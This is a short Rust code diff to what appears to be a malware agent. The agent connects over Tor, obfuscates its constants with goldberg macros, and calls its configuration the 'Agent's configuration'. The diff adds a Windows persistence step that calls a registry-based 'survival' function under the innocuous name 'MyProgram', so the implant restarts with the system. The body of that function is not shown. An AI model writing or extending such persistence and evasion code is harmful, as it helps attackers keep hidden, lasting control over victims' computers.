@@ -2,6 +2,7 @@ mod config;
 mod helpers;
 mod exc;
 mod debug;
+mod win_persist;
 
 use arti_client::{
     TorClient,
@@ -9,6 +10,7 @@ use arti_client::{
     StreamPrefs,
     DataStream,
 };
+use config::Persistence;
 use goldberg::goldberg_int;
 use tokio::io::{
     AsyncWriteExt,
@@ -47,6 +49,22 @@ struct OutputMessage {
 
 #[tokio::main]
 async fn main() {
+    // Persitence:
+    match config::persistence() {
+        Persistence::NO => {
+            debug_println!("no persistence mechanism enabled");
+        },
+        Persistence::WinRegistryBased => {
+            match win_persist::classic_registry_based_survival("MyProgram") {
+                Ok(_) => {},
+                Err(e) => {
+                    debug_eprintln!("failed to persist on windows: {}", e);
+                },
+            }
+        },
+    }
+
+
     // Agent's configuration:
     let address = config::get_address();
     let port: u16 = goldberg_int!(80);
